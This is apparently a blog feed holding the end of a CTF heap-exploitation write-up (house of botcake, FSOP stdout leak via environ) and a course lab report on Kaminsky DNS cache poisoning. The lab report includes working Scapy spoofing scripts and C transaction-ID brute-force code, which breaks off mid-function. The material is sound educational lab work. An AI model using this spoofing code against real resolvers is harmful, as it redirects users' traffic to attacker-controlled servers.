title="方法二：FSOP"></a>方法二：FSOP</h2><p>这种方法可以用来在libc.so的GOT也不可写的情况下完成攻击。其基本思想还是劫持栈地址完成ROP。</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>这里要用到<a href="https://wargames.ret2.systems/level/how2heap_house_of_botcake_2.34">house of botcake</a>这种攻击方法。在how2heap简单学习一下。他的原理其实是利用chunk在unsortedbin中合并的特性完成tcache dup。</p><p>比方说有两个unsortedbin大小，并且大小相同的块，分别是A,B。其中A物理地址在B前面。那么我们首先把这个大小对应的tcache填满，之后释放B，接着释放A，此时A,B就会合并。如下图，在unsortedbin里面有一个0x220大小的chunk。</p><p><img src="/2022/07/28/dice2022-hope/image-20220731140211392.png" alt="image-20220731140211392"></p><p>接下来，我们从tcache拿走一个块，之后把<strong>位于后面位置的B块释放</strong>。从下图我们可以看到，tcache头部现在是和unsortedbin中被合并的B块是一个。这样就完成了chunk overlapping。</p><p><img src="/2022/07/28/dice2022-hope/image-20220731140341161.png" alt="image-20220731140341161"></p><p>接下来利用的方法，例如从unsortedbin中直接拿出整个快，并修改BK，就达成了劫持tcache。</p><p>总结一下流程</p><blockquote><ul><li>Allocate 7 <code>0x100</code> sized chunks to then fill the tcache (7 entries).</li><li>Allocate two more <code>0x100</code> sized chunks (<code>prev</code> and <code>a</code> in the example).</li><li>Allocate a small “barrier” <code>0x10</code> sized chunk.</li><li>Fill the tcache by freeing the first 7 chunks.</li><li>free(a), thus <code>a</code> falls into the unsortedbin.</li><li>free(prev), thus <code>prev</code> is consolidated with <code>a</code> to create a large <code>0x221</code> sized chunk that is yet in the unsortedbin.</li><li>Request one more <code>0x100</code> sized chunk to let a single entry left in the tcache.</li><li>free(a) again, given <code>a</code> is part of the large <code>0x221</code> sized chunk it leads to an UAF. Thus <code>a</code> falls into the tcache.</li><li>That’s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li></ul></blockquote><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>这里的想法是利用environ来拿到栈地址，之后分配到栈地址进行ROP。这个想法和今年国赛的高版本libc题目(newest_note)很像。不过这里有个作者是通过FSOP，修改put输出时的指针来指向environ的地方进行泄露的。</p><p>其实这道题利用完全一样的流程，分配到一个environ之后输出拿到栈地址，之后重复一样的过程一样可以getshell。这里复习一下利用IO_FILE泄露数据的方法。</p><p>其实也还是参考了<a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">ray-cp</a>师傅的博客，写的非常好。我之前也<a href="https://nicholas-wei.github.io/2022/01/29/IO-file/">有学习过</a>。</p><p>具体利用方式，是这张图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">3</span>, </span><br><span class="line">    pwn.p64(<span class="number">0xfbad1800</span>) + <span class="comment"># _flags</span></span><br><span class="line">    pwn.p64(environ)*<span class="number">3</span> + <span class="comment"># _IO_read_*</span></span><br><span class="line">    pwn.p64(environ) + <span class="comment"># _IO_write_base</span></span><br><span class="line">    pwn.p64(environ + <span class="number">0x8</span>)*<span class="number">2</span> + <span class="comment"># _IO_write_ptr + _IO_write_end</span></span><br><span class="line">    pwn.p64(environ + <span class="number">8</span>) + <span class="comment"># _IO_buf_base</span></span><br><span class="line">    pwn.p64(environ + <span class="number">8</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    , <span class="number">0x100</span>) </span><br><span class="line"></span><br><span class="line">stack = pwn.u64(io.recv(<span class="number">8</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x130</span> - <span class="number">8</span> </span><br><span class="line"><span class="comment"># Offset of the saved rip that belongs to frame of the op_malloc function</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;stack: <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里的_IO_write_ptr - _IO_write_base是要输出数据的长度，这里设置为8。然后数据是从_IO_write_base里面输出。因此这里填上environ。但是接下来我们破坏了缓冲区，需要确保在完成这次输出之后，我们会重新初始化缓冲区，因此我们需要_IO_buf_base == _IO_buf_end。这个常见模板可以供以后参考，用来泄露地址。</p><p><img src="/2022/07/28/dice2022-hope/image-20220731154643996.png" alt="image-20220731154643996"></p><p>而具体的思路，就是通过house of botcake构造任意地址分配chunk，改到stdout结构体这里修改。这里新学到的是buf的复原操作，之前也没有点感到过。</p><p>(但是个人觉得，还是直接分配到environ来得方便。exp参考底下第一个链接。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/ret2school/ctf/blob/master/2022/diceCTF/pwn/catastrophe/catastrophe.md">catastrophy的FSOP利用</a></p><p><a href="https://github.com/nobodyisnobody/write-ups/blob/main/DiceCTF%40HOPE.2022/pwn/catastrophe/working.exploit.py">catastrophy修改GOT利用</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
            <tag> heap </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security-lab6</title>
      <link href="/2022/05/30/software-security-lab6/"/>
      <url>/2022/05/30/software-security-lab6/</url>
      
        <content type="html"><![CDATA[<p>《软件安全》课程实验3，有关DNS相关原理以及漏洞的攻击。Kaminsky攻击方法</p><span id="more"></span><h1 id="software-security-lab6"><a href="#software-security-lab6" class="headerlink" title="software-security-lab6"></a>software-security-lab6</h1><p>[TOC]</p><h1 id="DNS攻击原理"><a href="#DNS攻击原理" class="headerlink" title="DNS攻击原理"></a>DNS攻击原理</h1><h2 id="传统攻击"><a href="#传统攻击" class="headerlink" title="传统攻击"></a>传统攻击</h2><p>如下图所示</p><p><img src="/2022/05/30/software-security-lab6/image-20220530110330762.png" alt="image-20220530110330762"></p><p>具体流程为：</p><ol><li>受害者向DNS发送一个查询请求</li><li>此时DNS服务器应该向跟根务器等一级一级询问</li><li>攻击者伪装自己是权威DNS服务器，发送一个假的数据给local resolver(同时需要爆破TXID)</li><li>如果攻击者抢先在权威DNS服务器之前传送了数据，就完成了攻击。</li></ol><h2 id="Kaminsky攻击"><a href="#Kaminsky攻击" class="headerlink" title="Kaminsky攻击"></a>Kaminsky攻击</h2><p>改进的攻击主要防止如果一次攻击没有成功的情况下，需要等待一个完整的TTL之后才能下一次攻击的特性。具体方案如下。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530131343433.png" alt="image-20220530131343433"></p><ol><li>攻击者A1向服务器发送一个请求$rand.google.com的请求</li><li>服务器<strong>一定</strong>无法解析域名。于是要向谷歌的官方DNS服务器询问。</li><li>在这个过程中，A2不断地向本地DNS服务器发送伪造数据包。数据包中不仅包含$RAND.google.com的ip，还包含<a href="http://www.google.com的ip.**注意此时本地dns服务器如果成功收到伪造的包,就会把$rand.google.com的ip和www.google.com的ip都记下来(作为一个dns解析的ip地址).**这个时候就完成了一次伪造的ip写入./">www.google.com的IP。**注意此时本地DNS服务器如果成功收到伪造的包，就会把$RAND.google.com的ip和www.google.com的IP都记下来(作为一个dns解析的IP地址)。**这个时候就完成了一次伪造的IP写入。</a></li></ol><p>注意这个攻击相比于上一个：上一个可能要等很多个TTL，这一次成功只是时间问题，可以一直尝试下去。</p><h2 id="环境验证"><a href="#环境验证" class="headerlink" title="环境验证"></a>环境验证</h2><p>首先是<code>dig ns.attacker32.com</code></p><p><img src="/2022/05/30/software-security-lab6/image-20220530140035570.png" alt="image-20220530140035570"></p><p>接下来看一下<code>example.com</code>对应的IP。如果直接访问，可以看到DNS解析出来的是一个真实的IP，可以随意访问。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530140247389.png" alt="image-20220530140247389"></p><p>但是如果借用攻击者的DNS访问，出来的结果是攻击者自己设置的<code>example.com</code>的IP。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530140514847.png" alt="image-20220530140514847"></p><h1 id="task2-construct-DNS-request"><a href="#task2-construct-DNS-request" class="headerlink" title="task2:construct DNS request"></a>task2:construct DNS request</h1><p>这里我们需要伪造一个包。如下所示是我用<code>wireshark</code>抓包得到的结果。可以看到我们伪造的DNS包经过了服务器的响应，返回了伪造的IP地址。并且也成功的被wireshark识别为一个DNS回应。这说明我们的伪造大致是正确的。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530143654170.png" alt="image-20220530143654170"></p><p>用到的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">exec attack</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&quot;www.example.com&quot;</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,qr = <span class="number">0</span>, qdcount = <span class="number">1</span>, ancount = <span class="number">0</span>,nscount = <span class="number">0</span>,arcount = <span class="number">0</span>, qd = Qdsec)</span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.153&#x27;</span>, src = <span class="string">&#x27;10.9.0.1&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">53</span>, sport = <span class="number">12345</span>, chksum = <span class="number">0</span>)</span><br><span class="line">request = ip/udp/dns</span><br><span class="line"></span><br><span class="line">send(request,verbose=<span class="number">0</span>,iface = <span class="string">&quot;br-62635d9cf0f7&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="task3-spoof-DNS-replies"><a href="#task3-spoof-DNS-replies" class="headerlink" title="task3: spoof DNS replies"></a>task3: spoof DNS replies</h1><p>这里要求填写一系列字段的值。为了方便观察，我们先使用dig看一看DNS一般怎么回复。下面是一个正常查询IP的过程。在这里我们可以看到ns字段的作用。从下面的包可以看到，这里的ns是example.com对应的DNS解析服务器。因此我们在自己攻击时，需要将这里写成attacker的DNS服务器地址。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530162732918.png" alt="image-20220530162732918"></p><p>使用以下代码完成一个伪造的DNS包的回复。其中最重要的字段是DNS()伪造包的部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name = <span class="string">&quot;123.example.com&quot;</span> <span class="comment"># query network</span></span><br><span class="line">domain = <span class="string">&quot;exmaple.com&quot;</span> <span class="comment"># query&#x27;s domain name</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span> <span class="comment"># hacker&#x27;s DNS 域名</span></span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Anssec = DNSRR(rrname=name, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec = DNSRR(rrname=domain, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,aa = <span class="number">1</span>, rd = <span class="number">1</span>, qr = <span class="number">1</span>, qdcount = <span class="number">1</span>, </span><br><span class="line">            ancount = <span class="number">1</span>,nscount = <span class="number">1</span>,arcount = <span class="number">0</span>, qd = Qdsec, an = Anssec, ns = NSsec)</span><br><span class="line"></span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.53&#x27;</span>,src = <span class="string">&#x27;10.9.0.153&#x27;</span>) <span class="comment"># dst 10.9.0.53 is the victim DNS server</span></span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>,sport = <span class="number">53</span>, chksum = <span class="number">0</span>) <span class="comment"># dest is 33333 port</span></span><br><span class="line">reply = ip/udp/dns</span><br><span class="line"></span><br><span class="line">send(reply,verbose=<span class="number">0</span>,iface = <span class="string">&quot;br-62635d9cf0f7&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到我们回复的包的内容。都是符合预期的。并且wireshark也将其解析为标准的DNS返回报文。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530162354073.png" alt="image-20220530162354073"></p><h1 id="task4-full-attack"><a href="#task4-full-attack" class="headerlink" title="task4: full attack"></a>task4: full attack</h1><p>这里我们要用C模拟发送包，因为python发送的速度太慢了。我们需要修改的是transanctionID的数据。从下图的reply包中可以看出，这个ID处于偏移0x1C的位置上。这个位置的数据需要爆破。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530171422638.png" alt="image-20220530171422638"></p><p>接着看看我们伪造的来源IP是什么。从下图中可以看到，我们最后一个访问的DNS服务器是b.iana-servers.net，使用nslookup可以看到对应的IP地址为199.43.133.53。因此可以确定我们reply包中ip的sec应该是199.43.133.53</p><p><img src="/2022/05/30/software-security-lab6/image-20220530171123461.png" alt="image-20220530171123461"></p><p>之后为了使得回复的包的域名和我们发送的一样，也需要找到在发送的包和返回的包中的域名起始位置。</p><table><thead><tr><th>文件</th><th>项目</th><th>偏移</th></tr></thead><tbody><tr><td>发送包</td><td>域名偏移</td><td>0x29</td></tr><tr><td>接受包</td><td>域名偏移</td><td>0x29、0x40</td></tr><tr><td>接受包</td><td>trans字段偏移</td><td>0x1c</td></tr></tbody></table><h2 id="构造包"><a href="#构造包" class="headerlink" title="构造包"></a>构造包</h2><p>依然是使用task3的脚本生成一个回复报文。这里构造一个回复包(发送包不列出了)，之后用C直接修改包中特定偏移的数据，就不用每次构造所有数据了，能够更大程度的加快速度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name = <span class="string">&quot;12345.example.com&quot;</span> <span class="comment"># query network 这里要注意是开始5位才能和C语言的对上</span></span><br><span class="line">domain = <span class="string">&quot;example.com&quot;</span> <span class="comment"># query&#x27;s domain name</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span> <span class="comment"># hacker&#x27;s DNS server name</span></span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Anssec = DNSRR(rrname=name, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec = DNSRR(rrname=domain, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,aa = <span class="number">1</span>, rd = <span class="number">1</span>, qr = <span class="number">1</span>, qdcount = <span class="number">1</span>, </span><br><span class="line">            ancount = <span class="number">1</span>,nscount = <span class="number">1</span>,arcount = <span class="number">0</span>, qd = Qdsec, an = Anssec, ns = NSsec)</span><br><span class="line"></span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.53&#x27;</span>,src = <span class="string">&#x27;199.43.133.53&#x27;</span>) <span class="comment"># dst 10.9.0.53 is the victim DNS server</span></span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>,sport = <span class="number">53</span>, chksum = <span class="number">0</span>) <span class="comment"># dest is 33333 port</span></span><br><span class="line">reply = ip/udp/dns</span><br><span class="line"></span><br><span class="line"><span class="comment"># send(reply,verbose=0,iface = &quot;br-62635d9cf0f7&quot;)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(reply))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在wireshark中可以看到我们构造的报文是合法的，可以通过wireshark识别。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530190651616.png" alt="image-20220530190651616"></p><h2 id="使用C修改并发送"><a href="#使用C修改并发送" class="headerlink" title="使用C修改并发送"></a>使用C修改并发送</h2><p>使用的C语言代码如下所示。其实改动并不多。下面的代码主要做了以下事情。</p><ol><li><strong>随机生成一个$(rand).example.com，并向服务器发送这样的访问请求</strong>，触发服务器的DNS询问过程。</li><li>立刻向本地的DNS服务器发送伪造的DNS响应包。其中需要修改的是transID字段，并且<strong>把伪造包中的域名修改为上一步发送的随机域名</strong>。<strong>将构造包中的example.com的权威域名服务器修改为攻击者自己的DNS服务器</strong>。</li><li>不断重复上述过程。</li></ol><p>一下是代码部分。主要是修改了返回给用户的包中<strong>trans</strong>字段的数字(来爆破原先的transID)，以及对应的域名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_SIZE 1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">                     iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">                     iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address </span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span>   <span class="comment">//Destination IP address </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span class="type">int</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the DNS request packet from file</span></span><br><span class="line">  FILE * f_req = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_req) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_req[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_req = fread(ip_req, <span class="number">1</span>, MAX_FILE_SIZE, f_req);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load the first DNS response packet from file</span></span><br><span class="line">  FILE * f_resp = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_resp) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_resp[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_resp = fread(ip_resp, <span class="number">1</span>, MAX_FILE_SIZE, f_resp);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">  <span class="type">int</span> time = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate a random name with length 5</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)  name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//##################################################################</span></span><br><span class="line">    <span class="comment">/* Step 1. Send a DNS request to the targeted local DNS server.</span></span><br><span class="line"><span class="comment">               This will trigger the DNS server to send out DNS queries */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... Students should add code here.</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// modify domain name</span></span><br><span class="line">      <span class="comment">// 发送随机的域名</span></span><br><span class="line">      ip_req[<span class="number">0x29</span>+i] = name[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send_dns_request(ip_req,n_req);</span><br><span class="line">    <span class="comment">/* Step 2. Send many spoofed responses to the targeted local DNS server,</span></span><br><span class="line"><span class="comment">               each one with a different transaction ID. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... Students should add code here.</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 将返回的域名改成发送的</span></span><br><span class="line">      ip_resp[<span class="number">0x29</span>+i] = name[i]; <span class="comment">// 为什么要修改两个值？因为回应的包里面既包含了query的内容，也包含了响应的，所以要修改两次。</span></span><br><span class="line">      ip_resp[<span class="number">0x40</span>+i] = name[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(time=<span class="number">0</span>;time&lt;<span class="number">10000</span>;time++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// modify trans, 2 bytes, change it at random</span></span><br><span class="line">      <span class="comment">// 爆破trans位置的信息, 一共2byte</span></span><br><span class="line">      ip_resp[<span class="number">0x1c</span>] = rand()%<span class="number">256</span>;</span><br><span class="line">      ip_resp[<span class="number">0x1d</span>] = rand()%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">      send_dns_response(ip_resp,n_resp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//##################################################################</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use for sending DNS request.</span></span><br><span class="line"><span class="comment"> * Add arguments to the function definition if needed.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *req, <span 